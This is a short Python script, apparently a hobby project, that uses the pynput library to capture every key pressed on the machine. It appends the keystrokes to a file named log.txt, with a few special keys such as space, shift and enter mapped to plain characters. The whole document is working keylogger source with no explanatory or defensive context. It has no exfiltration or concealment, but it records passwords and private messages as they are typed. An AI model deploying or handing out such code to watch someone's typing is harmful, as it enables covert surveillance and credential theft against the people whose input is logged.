# main file
from pynput.keyboard import Listener

def write_to_file(keys):

    # replacing the single quotes from the keystrokes with nothing
    letter = str(keys).replace("'", "")
    
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()


